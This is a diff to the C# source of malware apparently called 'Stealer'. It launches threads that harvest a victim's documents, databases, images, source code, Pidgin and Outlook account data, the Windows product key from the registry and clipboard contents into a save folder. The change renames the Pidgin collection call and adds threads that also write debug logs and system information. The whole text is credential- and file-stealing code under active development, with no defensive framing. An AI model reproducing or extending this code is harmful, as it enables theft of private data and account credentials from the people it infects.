@@ -12,7 +12,6 @@ namespace Stealer
         {
             // List with threads
             List <Thread> Threads = new List<Thread>();
-
             try
             {
                 // Collect files (documents, databases, images, source codes)
@@ -45,7 +44,7 @@ namespace Stealer
 
                 // Write pidgin accounts
                 Threads.Add(new Thread(() =>
-                    Pidgin.GetAccounts(sSavePath + "\\Messenger\\Pidgin")
+                    Pidgin.Get(sSavePath + "\\Messenger\\Pidgin")
                 ));
 
                 // Write outlook accounts
@@ -141,6 +140,14 @@ namespace Stealer
                     // Write product key
                     File.WriteAllText(sSavePath + "\\System\\ProductKey.txt",
                         ProductKey.GetWindowsProductKeyFromRegistry())
+                ));
+                // Debug logs
+                Threads.Add(new Thread(() =>
+                    Logging.Save(sSavePath + "\\System\\Debug.txt")
+                ));
+                // System info
+                Threads.Add(new Thread(() =>
+                    SysInfo.Save(sSavePath + "\\System\\Info.txt")
                 ));
                 // Clipboard text
                 Threads.Add(new Thread(() =>
